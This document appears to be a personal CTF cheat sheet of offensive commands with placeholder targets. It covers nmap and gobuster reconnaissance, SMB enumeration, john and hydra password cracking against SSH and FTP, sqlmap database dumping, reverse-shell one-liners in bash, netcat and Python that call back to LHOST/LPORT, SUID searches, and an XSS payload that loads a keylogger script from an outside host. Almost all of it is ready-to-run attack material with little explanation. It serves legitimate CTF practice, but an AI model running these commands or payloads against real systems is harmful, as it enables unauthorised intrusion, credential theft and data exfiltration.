# CTF Writeups

Commands and notes I actually use.

## Recon
```sh
nmap -T4 -A -p- TARGET -oN nmap.txt
nmap -sV TARGET                      # service versions
nmap -O TARGET                       # OS detection
nmap -sS TARGET                      # stealth SYN scan
```
```sh
gobuster dir -u TARGET -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```sh
smbclient -L //TARGET_IP -U username
smbmap -H TARGET_IP
```

## Cracking
```sh
zip2john file.zip > file.zip.hash
john file.zip.hash
```
```sh
hydra -l mark -P /usr/share/wordlists/rockyou.txt IP ssh
hydra -l admin -P /usr/share/john/password.lst -vV ftplogin.com ftp
```

## SQLMap
```sh
sqlmap -u "http://target.com/vuln_param" --batch --dbs
sqlmap -u "http://target.com/vuln_param" -D db_name --tables
sqlmap -u "http://target.com/vuln_param" -D db_name -T table -C column --dump
```

## Reverse Shells

Bash:
```sh
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

Netcat:
```sh
nc -e /bin/sh LHOST LPORT
```

Python:
```python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## File Search
```sh
find / -type f -name '*.txt' 2>/dev/null
find / -perm -4000 2>/dev/null        # SUID binaries
```

## XSS Payloads
```html
<script>alert("test")</script>
<script src="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js"></script>
```

## References

- [GTFOBins](https://gtfobins.github.io/) - privesc via misconfigured binaries
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - web app payloads
- [HackTricks](https://book.hacktricks.xyz/) - methodology reference
